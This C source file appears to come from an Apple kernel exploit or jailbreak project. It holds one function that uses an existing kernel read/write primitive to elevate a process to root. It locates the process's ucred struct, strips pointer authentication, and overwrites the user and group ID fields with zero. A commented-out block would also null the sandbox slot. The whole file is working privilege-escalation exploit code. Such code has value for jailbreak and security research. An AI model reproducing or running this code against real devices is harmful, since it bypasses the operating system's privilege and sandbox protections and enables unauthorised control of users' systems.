#include "../include/tools.h"
#include "../include/kernel.h"

int elevate(krw_handlers *toolbox, pid_t pid)
{
    addr64_t myproc = find_pid(toolbox, pid);

    addr64_t ucred_s = 0;

    if (toolbox->kread(myproc + __ucredOffset, &ucred_s, sizeof(addr64_t)))
    {
        printf("Failed to read my ucred struct\n");
        return 1;
    }
    else
        ucred_s = STRIP_PAC(ucred_s);

    uint32_t root = 0;

    // set group and user id to 0
    // apparently nullifying all the other kern struct variables isn't required
    if (toolbox->kwrite(&root, ucred_s + __cr_uid, sizeof(uint32_t)) ||
        toolbox->kwrite(&root, ucred_s + __cr_ruid, sizeof(uint32_t)) ||
        toolbox->kwrite(&root, ucred_s + __cr_rgid, sizeof(uint32_t)) ||
        toolbox->kwrite(&root, ucred_s + __cr_svgid, sizeof(uint32_t)) ||
        toolbox->kwrite(&root, ucred_s + __cr_svuid, sizeof(uint32_t)))
    {
        printf("Ucred writing failed!");
        return 1;
    }

    if (getuid() != 0) // apparently this just works after nulling __cs_svuid??
    {
        printf("Elevation failed :( UID: %d\n", getuid());
        return 1;
    }

    addr64_t cs_label_s = 0;

    if (toolbox->kread(ucred_s + __label, &cs_label_s, sizeof(addr64_t)))
    {
        printf("Failed to read my label struct\n");
        return 1;
    }
    else
        cs_label_s = STRIP_PAC(cs_label_s);

    // printf("nulling at %llu", cs_label_s);

    // uint64_t null = 0;
    // if (toolbox->kwrite(&null, cs_label_s + __sandbox_slot, sizeof(uint64_t)))
    // {
    //     printf("Failed to nullify sandbox slot :(\n");
    //     return 1;
    // }

    return 0;
}